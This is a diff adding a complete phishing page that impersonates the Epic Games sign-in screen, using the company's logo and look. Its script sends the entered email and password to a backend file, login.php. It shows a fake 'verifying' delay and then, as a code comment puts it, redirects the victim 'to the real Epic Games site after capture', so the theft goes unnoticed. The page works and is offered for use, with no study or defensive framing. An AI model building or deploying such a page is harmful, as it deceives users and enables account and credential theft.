@@ -1,0 +1,196 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Epic Games - Sign In</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            color: #fff;
+        }
+        .login-container {
+            background: rgba(30, 30, 46, 0.9);
+            padding: 40px;
+            border-radius: 12px;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.5);
+            width: 100%;
+            max-width: 420px;
+            border: 1px solid #343a4a;
+        }
+        .epic-logo {
+            display: block;
+            margin: 0 auto 30px auto;
+            width: 180px;
+        }
+        h2 {
+            text-align: center;
+            margin-bottom: 10px;
+            font-weight: 600;
+        }
+        .subtitle {
+            text-align: center;
+            color: #b0b7c3;
+            margin-bottom: 30px;
+            font-size: 0.9em;
+        }
+        .input-group {
+            margin-bottom: 20px;
+        }
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-size: 0.9em;
+            color: #b0b7c3;
+        }
+        input {
+            width: 100%;
+            padding: 14px;
+            background: #232838;
+            border: 1px solid #343a4a;
+            border-radius: 6px;
+            color: #fff;
+            font-size: 1em;
+            box-sizing: border-box;
+            transition: border 0.2s;
+        }
+        input:focus {
+            outline: none;
+            border-color: #0078f2;
+        }
+        .login-btn {
+            width: 100%;
+            padding: 15px;
+            background: #0078f2;
+            border: none;
+            border-radius: 6px;
+            color: white;
+            font-size: 1.05em;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.2s;
+            margin-top: 10px;
+        }
+        .login-btn:hover {
+            background: #0056b3;
+        }
+        .footer-links {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 25px;
+            font-size: 0.85em;
+        }
+        .footer-links a {
+            color: #b0b7c3;
+            text-decoration: none;
+        }
+        .footer-links a:hover {
+            color: #0078f2;
+            text-decoration: underline;
+        }
+        .error-message {
+            color: #ff4757;
+            text-align: center;
+            margin-top: 15px;
+            font-size: 0.9em;
+            display: none;
+        }
+        .loading {
+            display: none;
+            text-align: center;
+            margin-top: 15px;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a7/Epic_Games_logo.png/240px-Epic_Games_logo.png" alt="Epic Games Logo" class="epic-logo">
+        <h2>Sign into your Epic Games Account</h2>
+        <p class="subtitle">Enter your credentials to access the Epic Games ecosystem.</p>
+        
+        <form id="loginForm">
+            <div class="input-group">
+                <label for="email">Email Address</label>
+                <input type="email" id="email" name="email" placeholder="name@example.com" required autocomplete="username">
+            </div>
+            
+            <div class="input-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" placeholder="Enter your password" required autocomplete="current-password">
+            </div>
+            
+            <button type="submit" class="login-btn" id="submitBtn">Sign In</button>
+            
+            <div class="error-message" id="errorMsg">
+                Incorrect email or password. Please try again.
+            </div>
+            
+            <div class="loading" id="loading">
+                Verifying your credentials...
+            </div>
+        </form>
+        
+        <div class="footer-links">
+            <a href="#">Create Account</a>
+            <a href="#">Forgot Password?</a>
+            <a href="#">Privacy Policy</a>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const submitBtn = document.getElementById('submitBtn');
+            const errorMsg = document.getElementById('errorMsg');
+            const loading = document.getElementById('loading');
+            
+            // Show loading, hide error
+            submitBtn.style.display = 'none';
+            errorMsg.style.display = 'none';
+            loading.style.display = 'block';
+            
+            const formData = new FormData(this);
+            const data = Object.fromEntries(formData);
+            
+            // Send data to our backend
+            fetch('login.php', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(data)
+            })
+            .then(response => response.json())
+            .then(result => {
+                // Simulate a delay for "verification"
+                setTimeout(() => {
+                    if (result.success) {
+                        // Redirect to the real Epic Games site after capture
+                        window.location.href = 'https://www.epicgames.com/id/login?redirectUrl=https://www.epicgames.com/';
+                    } else {
+                        // Show error and reset form
+                        errorMsg.style.display = 'block';
+                        loading.style.display = 'none';
+                        submitBtn.style.display = 'block';
+                        document.getElementById('password').value = '';
+                        document.getElementById('password').focus();
+                    }
+                }, 1500);
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                errorMsg.style.display = 'block';
+                loading.style.display = 'none';
+                submitBtn.style.display = 'block';
+            });
+        });
+    </script>
+</body>
+</html>
